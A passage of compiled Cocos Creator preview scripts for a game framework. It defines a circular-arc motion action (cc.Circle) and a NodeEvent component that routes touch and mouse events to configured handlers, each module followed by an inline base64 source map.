3d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5cclxuLyoqXHJcbiAqIOWRveS7pOaooeW8j+aOpeWPoyjml6DnirbmgIHmiafooYzpgLvovpHvvIznm7jlvZPkuo7nuq/lh73mlbApXHJcbiAqIDEu57un5om/5q2k5o6l5Y+j5bqU6K+l5re75YqgQGNjY2xhc3MoY2xhc3NOYW1lKVxyXG4gKiAyLueUseS6juWRveS7pOaooeW8j+WPguaVsCguLi5hcmdzKeayoeacieexu+Wei++8jOaJgOS7peW7uuiuruWPguaVsOi+g+WkmuaDheWGteS4i+S9v+eUqOmdmeaAgeaWueazleS7o+abv2NvbW1hbmTjgIJcclxuICogKi9cclxuZXhwb3J0IGludGVyZmFjZSBJQ29tbWFuZHtcclxuICAgIGV4ZWN1dGUgKC4uLmFyZ3MpOlByb21pc2U7XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/actions/CCCircleAction.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'afdccsULkNP67nQoHfoJT7g', 'CCCircleAction');
// framework/actions/CCCircleAction.js

"use strict";

//creator from pabble 2018-11-12
cc.Circle = cc.Class({
  name: 'cc.Circle',
  "extends": cc.ActionInterval,

  /**
   * @param duration  时间
   * @param center  圆心点
   * @param r  半径
   * @param s  起点弧度
   * @param e  终点弧度
   * @param revert  是否顺时针(默认顺时针，逆时针传false)
   * */
  ctor: function ctor(duration, center, r, s, e, revert) {
    if (revert === void 0) {
      revert = false;
    }

    this._duration = duration;
    this._center = center;
    this._radius = r;
    this._startAngle = s;
    this._endAngle = e;
    this._dstartAngle = s % (2 * Math.PI);
    this._dendAngle = e % (2 * Math.PI);
    this._runTime = 0;
    this._direction = revert;

    if (this._direction) {
      if (this._dendAngle >= this._dstartAngle) {
        this._dstartAngle += 2 * Math.PI;
      }
    } else {
      if (this._dendAngle <= this._dstartAngle) {
        this._dendAngle += 2 * Math.PI;
      }
    }

    cc.Circle.prototype.initWithDuration.call(this, duration, center, r, s, e, revert);
  },
  initWithDuration: function initWithDuration(duration) {
    cc.ActionInterval.prototype.initWithDuration.call(this, duration);
    return true;
  },
  startWithTarget: function startWithTarget(target) {
    cc.ActionInterval.prototype.startWithTarget.call(this, target);
  },
  update: function update(dt) {
    dt = this._computeEaseTime(dt);

    if (this.target) {
      var a = (this._dendAngle - this._dstartAngle) * dt + this._dstartAngle;
      var x = this._center.x + this._radius * Math.sin(a);
      var y = this._center.y + this._radius * Math.cos(a);
      this.target.x = x;
      this.target.y = y;
    }
  },
  reverse: function reverse() {
    var action = new cc.Circle(this._duration, this._center, this._radius, this._endAngle, this._startAngle, !this._direction);

    this._cloneDecoration(action);

    this._reverseEaseList(action);

    return action;
  },
  clone: function clone() {
    var action = new cc.Circle(this._duration, this._center, this._radius, this._startAngle, this._endAngle, this._direction);

    this._cloneDecoration(action);

    this._reverseEaseList(action);

    return action;
  }
});

cc.circle = function (duration, center, r, s, e, revert) {
  return new cc.Circle(duration, center, r, s, e, revert);
};

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvYWN0aW9ucy9DQ0NpcmNsZUFjdGlvbi5qcyJdLCJuYW1lcyI6WyJjYyIsIkNpcmNsZSIsIkNsYXNzIiwibmFtZSIsIkFjdGlvbkludGVydmFsIiwiY3RvciIsImR1cmF0aW9uIiwiY2VudGVyIiwiciIsInMiLCJlIiwicmV2ZXJ0IiwiX2R1cmF0aW9uIiwiX2NlbnRlciIsIl9yYWRpdXMiLCJfc3RhcnRBbmdsZSIsIl9lbmRBbmdsZSIsIl9kc3RhcnRBbmdsZSIsIk1hdGgiLCJQSSIsIl9kZW5kQW5nbGUiLCJfcnVuVGltZSIsIl9kaXJlY3Rpb24iLCJwcm90b3R5cGUiLCJpbml0V2l0aER1cmF0aW9uIiwiY2FsbCIsInN0YXJ0V2l0aFRhcmdldCIsInRhcmdldCIsInVwZGF0ZSIsImR0IiwiX2NvbXB1dGVFYXNlVGltZSIsImEiLCJ4Iiwic2luIiwieSIsImNvcyIsInJldmVyc2UiLCJhY3Rpb24iLCJfY2xvbmVEZWNvcmF0aW9uIiwiX3JldmVyc2VFYXNlTGlzdCIsImNsb25lIiwiY2lyY2xlIl0sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFBO0FBQ0FBLEVBQUUsQ0FBQ0MsTUFBSCxHQUFZRCxFQUFFLENBQUNFLEtBQUgsQ0FBUztFQUNqQkMsSUFBSSxFQUFHLFdBRFU7RUFFakIsV0FBVUgsRUFBRSxDQUFDSSxjQUZJOztFQUdqQjtBQUNKO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0VBQ0lDLElBQUksRUFBQyxjQUFTQyxRQUFULEVBQWtCQyxNQUFsQixFQUF5QkMsQ0FBekIsRUFBMkJDLENBQTNCLEVBQTZCQyxDQUE3QixFQUErQkMsTUFBL0IsRUFBNEM7SUFBQSxJQUFiQSxNQUFhO01BQWJBLE1BQWEsR0FBTixLQUFNO0lBQUE7O0lBQzdDLEtBQUtDLFNBQUwsR0FBaUJOLFFBQWpCO0lBQ0EsS0FBS08sT0FBTCxHQUFlTixNQUFmO0lBQ0EsS0FBS08sT0FBTCxHQUFlTixDQUFmO0lBQ0EsS0FB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QUFsQyxFQUEwQyxLQUFLQyxPQUEvQyxFQUF1RCxLQUFLQyxXQUE1RCxFQUF3RSxLQUFLQyxTQUE3RSxFQUF1RixLQUFLTSxVQUE1RixDQUFiOztJQUNBLEtBQUtnQixnQkFBTCxDQUFzQkQsTUFBdEI7O0lBQ0EsS0FBS0UsZ0JBQUwsQ0FBc0JGLE1BQXRCOztJQUNBLE9BQU9BLE1BQVA7RUFDSDtBQTdEZ0IsQ0FBVCxDQUFaOztBQWdFQXJDLEVBQUUsQ0FBQ3lDLE1BQUgsR0FBWSxVQUFTbkMsUUFBVCxFQUFrQkMsTUFBbEIsRUFBeUJDLENBQXpCLEVBQTJCQyxDQUEzQixFQUE2QkMsQ0FBN0IsRUFBK0JDLE1BQS9CLEVBQXNDO0VBQzlDLE9BQU8sSUFBSVgsRUFBRSxDQUFDQyxNQUFQLENBQWNLLFFBQWQsRUFBdUJDLE1BQXZCLEVBQThCQyxDQUE5QixFQUFnQ0MsQ0FBaEMsRUFBa0NDLENBQWxDLEVBQW9DQyxNQUFwQyxDQUFQO0FBQ0gsQ0FGRCIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy9jcmVhdG9yIGZyb20gcGFiYmxlIDIwMTgtMTEtMTJcclxuY2MuQ2lyY2xlID0gY2MuQ2xhc3Moe1xyXG4gICAgbmFtZSA6ICdjYy5DaXJjbGUnLFxyXG4gICAgZXh0ZW5kcyA6IGNjLkFjdGlvbkludGVydmFsLFxyXG4gICAgLyoqXHJcbiAgICAgKiBAcGFyYW0gZHVyYXRpb24gIOaXtumXtFxyXG4gICAgICogQHBhcmFtIGNlbnRlciAg5ZyG5b+D54K5XHJcbiAgICAgKiBAcGFyYW0gciAg5Y2K5b6EXHJcbiAgICAgKiBAcGFyYW0gcyAg6LW354K55byn5bqmXHJcbiAgICAgKiBAcGFyYW0gZSAg57uI54K55byn5bqmXHJcbiAgICAgKiBAcGFyYW0gcmV2ZXJ0ICDmmK/lkKbpobrml7bpkogo6buY6K6k6aG65pe26ZKI77yM6YCG5pe26ZKI5LygZmFsc2UpXHJcbiAgICAgKiAqL1xyXG4gICAgY3RvcjpmdW5jdGlvbihkdXJhdGlvbixjZW50ZXIscixzLGUscmV2ZXJ0PWZhbHNlKXtcclxuICAgICAgICB0aGlzLl9kdXJhdGlvbiA9IGR1cmF0aW9uO1xyXG4gICAgICAgIHRoaXMuX2NlbnRlciA9IGNlbnRlcjtcclxuICAgICAgICB0aGlzLl9yYWRpdXMgPSByO1xyXG4gICAgICAgIHRoaXMuX3N0YXJ0QW5nbGUgPSBzO1xyXG4gICAgICAgIHRoaXMuX2VuZEFuZ2xlID0gZTtcclxuICAgICAgICB0aGlzLl9kc3RhcnRBbmdsZSA9IHMlICgyKk1hdGguUEkpXHJcbiAgICAgICAgdGhpcy5fZGVuZEFuZ2xlID0gZSUgKDIqTWF0aC5QSSlcclxuICAgICAgICB0aGlzLl9ydW5UaW1lID0gMDtcclxuICAgICAgICB0aGlzLl9kaXJlY3Rpb24gPSByZXZlcnRcclxuICAgICAgICBpZih0aGlzLl9kaXJlY3Rpb24pe1xyXG4gICAgICAgICAgICBpZih0aGlzLl9kZW5kQW5nbGUgPj0gdGhpcy5fZHN0YXJ0QW5nbGUpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZHN0YXJ0QW5nbGUrPTIqTWF0aC5QSVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgaWYodGhpcy5fZGVuZEFuZ2xlIDw9IHRoaXMuX2RzdGFydEFuZ2xlKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuX2RlbmRBbmdsZSs9MipNYXRoLlBJXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgY2MuQ2lyY2xlLnByb3RvdHlwZS5pbml0V2l0aER1cmF0aW9uLmNhbGwodGhpcywgZHVyYXRpb24sY2VudGVyLHIscyxlLHJldmVydCk7XHRcclxuICAgIH0sXHJcbiAgICBpbml0V2l0aER1cmF0aW9uOmZ1bmN0aW9uKGR1cmF0aW9uKXtcclxuICAgICAgICBjYy5BY3Rpb25JbnRlcnZhbC5wcm90b3R5cGUuaW5pdFdpdGhEdXJhdGlvbi5jYWxsKHRoaXMsIGR1cmF0aW9uKVxyXG4gICAgICAgIHJldHVybiB0cnVlO1xyXG4gICAgfSxcclxuICAgIHN0YXJ0V2l0aFRhcmdldCh0YXJnZXQpe1xyXG4gICAgICAgIGNjLkFjdGlvbkludGVydmFsLnByb3RvdHlwZS5zdGFydFdpdGhUYXJnZXQuY2FsbCh0aGlzLCB0YXJnZXQpO1xyXG4gICAgfSxcclxuICAgIHVwZGF0ZShkdCl7XHJcbiAgICAgICAgZHQgPSB0aGlzLl9jb21wdXRlRWFzZVRpbWUoZHQpO1xyXG4gICAgICAgIGlmKHRoaXMudGFyZ2V0KXtcclxuICAgICAgICAgICAgdmFyIGEgPSAodGhpcy5fZGVuZEFuZ2xlIC0gdGhpcy5fZHN0YXJ0QW5nbGUpICogKGR0KSArIHRoaXMuX2RzdGFydEFuZ2xlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICB2YXIgeCA9IHRoaXMuX2NlbnRlci54ICsgdGhpcy5fcmFkaXVzICogTWF0aC5zaW4oYSk7XHJcbiAgICAgICAgICAgIHZhciB5ID0gdGhpcy5fY2VudGVyLnkgKyB0aGlzLl9yYWRpdXMgKiBNYXRoLmNvcyhhKTtcclxuICAgICAgICAgICAgdGhpcy50YXJnZXQueCA9IHg7XHJcbiAgICAgICAgICAgIHRoaXMudGFyZ2V0LnkgPSB5XHJcbiAgICAgICAgfVxyXG4gICAgfSxcclxuICAgIHJldmVyc2U6ZnVuY3Rpb24gKCkge1xyXG4gICAgICAgIHZhciBhY3Rpb24gPSBuZXcgY2MuQ2lyY2xlKHRoaXMuX2R1cmF0aW9uLHRoaXMuX2NlbnRlcix0aGlzLl9yYWRpdXMsdGhpcy5fZW5kQW5nbGUsdGhpcy5fc3RhcnRBbmdsZSwhdGhpcy5fZGlyZWN0aW9uKVxyXG4gICAgICAgIHRoaXMuX2Nsb25lRGVjb3JhdGlvbihhY3Rpb24pO1xyXG4gICAgICAgIHRoaXMuX3JldmVyc2VFYXNlTGlzdChhY3Rpb24pO1xyXG4gICAgICAgIHJldHVybiBhY3Rpb247XHJcbiAgICB9LFxyXG4gICAgY2xvbmU6ZnVuY3Rpb24oKXtcclxuICAgICAgICB2YXIgYWN0aW9uID0gbmV3IGNjLkNpcmNsZSh0aGlzLl9kdXJhdGlvbix0aGlzLl9jZW50ZXIsdGhpcy5fcmFkaXVzLHRoaXMuX3N0YXJ0QW5nbGUsdGhpcy5fZW5kQW5nbGUsdGhpcy5fZGlyZWN0aW9uKVxyXG4gICAgICAgIHRoaXMuX2Nsb25lRGVjb3JhdGlvbihhY3Rpb24pO1xyXG4gICAgICAgIHRoaXMuX3JldmVyc2VFYXNlTGlzdChhY3Rpb24pO1xyXG4gICAgICAgIHJldHVybiBhY3Rpb247XHJcbiAgICB9XHJcbn0pXHJcblxyXG5jYy5jaXJjbGUgPSBmdW5jdGlvbihkdXJhdGlvbixjZW50ZXIscixzLGUscmV2ZXJ0KXtcclxuICAgIHJldHVybiBuZXcgY2MuQ2lyY2xlKGR1cmF0aW9uLGNlbnRlcixyLHMsZSxyZXZlcnQpXHJcbn0iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/NodeEvent.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6b1ecDYFXlE36An3M1fJwDV', 'NodeEvent');
// framework/component/NodeEvent.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var NodeEventType;
(function (NodeEventType) {
    NodeEventType[NodeEventType["TOUCH_START"] = 0] = "TOUCH_START";
    NodeEventType[NodeEventType["TOUCH_MOVE"] = 1] = "TOUCH_MOVE";
    NodeEventType[NodeEventType["TOUCH_END"] = 2] = "TOUCH_END";
    NodeEventType[NodeEventType["TOUCH_CANCEL"] = 3] = "TOUCH_CANCEL";
    NodeEventType[NodeEventType["MOUSE_DOWN"] = 4] = "MOUSE_DOWN";
    NodeEventType[NodeEventType["MOUSE_MOVE"] = 5] = "MOUSE_MOVE";
    NodeEventType[NodeEventType["MOUSE_ENTER"] = 6] = "MOUSE_ENTER";
    NodeEventType[NodeEventType["MOUSE_LEAVE"] = 7] = "MOUSE_LEAVE";
    NodeEventType[NodeEventType["MOUSE_UP"] = 8] = "MOUSE_UP";
    NodeEventType[NodeEventType["MOUSE_WHEEL"] = 9] = "MOUSE_WHEEL";
    NodeEventType[NodeEventType["POSITION_CHANGED"] = 10] = "POSITION_CHANGED";
    NodeEventType[NodeEventType["ROTATION_CHANGED"] = 11] = "ROTATION_CHANGED";
    NodeEventType[NodeEventType["SCALE_CHANGED"] = 12] = "SCALE_CHANGED";
    NodeEventType[NodeEventType["SIZE_CHANGED"] = 13] = "SIZE_CHANGED";
    NodeEventType[NodeEventType["ANCHOR_CHANGED"] = 14] = "ANCHOR_CHANGED";
    NodeEventType[NodeEventType["CHILD_ADDED"] = 15] = "CHILD_ADDED";
    NodeEventType[NodeEventType["CHILD_REMOVED"] = 16] = "CHILD_REMOVED";
    NodeEventType[NodeEventType["CHILD_REORDER"] = 17] = "CHILD_REORDER";
    NodeEventType[NodeEventType["GROUP_CHANGED"] = 18] = "GROUP_CHANGED";
})(NodeEventType || (NodeEventType = {}));
var map = new Map();
map.set(NodeEventType.TOUCH_START, cc.Node.EventType.TOUCH_START);
map.set(NodeEventType.TOUCH_MOVE, cc.Node.EventType.TOUCH_MOVE);
map.set(NodeEventType.TOUCH_END, cc.Node.EventType.TOUCH_END);
map.set(NodeEventType.TOUCH_CANCEL, cc.Node.EventType.TOUCH_CANCEL);
map.set(NodeEventType.MOUSE_DOWN, cc.Node.EventType.MOUSE_DOWN);
map.set(NodeEventType.MOUSE_MOVE, cc.Node.EventType.MOUSE_MOVE);
map.set(NodeEventType.MOUSE_ENTER, cc.Node.EventType.MOUSE_ENTER);
map.set(NodeEventType.MOUSE_LEAVE, cc.Node.EventType.MOUSE_LEAVE);
map.set(NodeEventType.MOUSE_UP, cc.Node.EventType.MOUSE_UP);
map.set(NodeEventType.MOUSE_WHEEL, cc.Node.EventType.MOUSE_WHEEL);
map.set(NodeEventType.POSITION_CHANGED, cc.Node.EventType.POSITION_CHANGED);
map.set(NodeEventType.SCALE_CHANGED, cc.Node.EventType.SCALE_CHANGED);
map.set(NodeEventType.ANCHOR_CHANGED, cc.Node.EventType.ANCHOR_CHANGED);
map.set(NodeEventType.CHILD_ADDED, cc.Node.EventType.CHILD_ADDED);
map.set(NodeEventType.CHILD_REMOVED, cc.Node.EventType.CHILD_REMOVED);
map.set(NodeEventType.CHILD_REORDER, cc.Node.EventType.CHILD_REORDER);
map.set(NodeEventType.GROUP_CHANGED, cc.Node.EventType.GROUP_CHANGED);
var NodeEvent = /** @class */ (function (_super) {
    __extends(NodeEvent, _super);
    function NodeEvent() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.once = false;
        _this.eventType = NodeEventType.TOUCH_END;
        _this.eventHandlers = [];
        return _this;
    }
    NodeEvent.prototype.onLoad = function () {
        this.node.on(map.get(this.eventType), this.onNodeEvent, this);
    };
    NodeEvent.prototype.onNodeEvent = function (event) {
        cc.Component.EventHandler.emitEvents(this.eventHandlers, event);
        if (this.once) {
            this.offEvent();
            this.destroy();
        }
    };
    NodeEvent.prototype.offEvent = function () {
        this.node.off(map.get(this.eventType), this.onNodeEvent, this);
    };
    NodeEvent.prototype.onDestroy = function () {
        this.offEvent();
    };
    __decorate([
        property
    ], NodeEvent.prototype, "once", void 0);
    __decorate([
        property({ type: cc.Enum(NodeEventType), displayName: "事件类型" })
    ], NodeEvent.prototype, "eventType", void 0);
    __decorate([
        property({ type: cc.Component.EventHandler, displayName: "触发事件" })
    ], NodeEvent.prototype, "eventHandlers", void 0);
    NodeEvent = __decorate([
        ccclass,
        menu("自定义/NodeEvent")
    ], NodeEvent);
    return NodeEvent;
}(cc.Component));
exports.default = NodeEvent;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L05vZGVFdmVudC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQU0sSUFBQSxLQUE0QixFQUFFLENBQUMsVUFBVSxFQUF4QyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQWlCLENBQUM7QUFFaEQsSUFBSyxhQW9CSjtBQXBCRCxXQUFLLGFBQWE7SUFDZCwrREFBVyxDQUFBO0lBQ1gsNkRBQVUsQ0FBQTtJQUNWLDJEQUFTLENBQUE7SUFDVCxpRUFBWSxDQUFBO0lBQ1osNkRBQVUsQ0FBQTtJQUNWLDZEQUFVLENBQUE7SUFDViwrREFBVyxDQUFBO0lBQ1gsK0RBQVcsQ0FBQTtJQUNYLHlEQUFRLENBQUE7SUFDUiwrREFBVyxDQUFBO0lBQ1gsMEVBQWdCLENBQUE7SUFDaEIsMEVBQWdCLENBQUE7SUFDaEIsb0VBQWEsQ0FBQTtJQUNiLGtFQUFZLENBQUE7SUFDWixzRUFBYyxDQUFBO0lBQ2QsZ0VBQVcsQ0FBQTtJQUNYLG9FQUFhLENBQUE7SUFDYixvRUFBYSxDQUFBO0lBQ2Isb0VBQWEsQ0FBQTtBQUNqQixDQUFDLEVBcEJJLGFBQWEsS0FBYixhQUFhLFFBb0JqQjtBQUVELElBQUksR0FBRyxHQUFHLElBQUksR0FBRyxFQUF5QixDQUFDO0FBQzNDLEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLFdBQVcsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxXQUFXLENBQUMsQ0FBQztBQUNsRSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxVQUFVLEVBQUUsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsVUFBVSxDQUFDLENBQUM7QUFDaEUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxhQUFhLENBQUMsU0FBUyxFQUFFLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLFNBQVMsQ0FBQyxDQUFDO0FBQzlELEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLFlBQVksRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxZQUFZLENBQUMsQ0FBQztBQUNwRSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxVQUFVLEVBQUUsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsVUFBVSxDQUFDLENBQUM7QUFDaEUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxhQUFhLENBQUMsVUFBVSxFQUFFLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLFVBQVUsQ0FBQyxDQUFDO0FBQ2hFLEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLFdBQVcsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxXQUFXLENBQUMsQ0FBQztBQUNsRSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxXQUFXLEVBQUUsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsV0FBVyxDQUFDLENBQUM7QUFDbEUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxhQUFhLENBQUMsUUFBUSxFQUFFLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLFFBQVEsQ0FBQyxDQUFDO0FBQzVELEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLFdBQVcsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxXQUFXLENBQUMsQ0FBQztBQUNsRSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxnQkFBZ0IsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDO0FBQzVFLEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLGFBQWEsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxhQUFhLENBQUMsQ0FBQztBQUN0RSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxjQUFjLEVBQUUsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsY0FBYyxDQUFDLENBQUM7QUFDeEUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxhQUFhLENBQUMsV0FBVyxFQUFFLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLFdBQVcsQ0FBQyxDQUFDO0FBQ2xFLEdBQUcsQ0FBQyxHQUFHLENBQUMsYUFBYSxDQUFDLGFBQWEsRUFBRSxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxhQUFhLENBQUMsQ0FBQztBQUN0RSxHQUFHLENBQUMsR0FBRyxDQUFDLGFBQWEsQ0FBQyxhQUFhLEVBQUUsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsYUFBYSxDQUFDLENBQUM7QUFDdEUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxhQUFhLENBQUMsYUFBYSxFQUFFLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLGFBQWEsQ0FBQyxDQUFDO0FBS3RFO0lBQXVDLDZCQUFZO0lBQW5EO1FBQUEscUVBK0JDO1FBNUJHLFVBQUksR0FBRyxLQUFLLENBQUM7UUFHYixlQUFTLEdBQWlCLGFBQWEsQ0FBQyxTQUFTLENBQUM7UUFHbEQsbUJBQWEsR0FBK0IsRUFBRSxDQUFDOztJQXNCbkQsQ0FBQztJQXBCR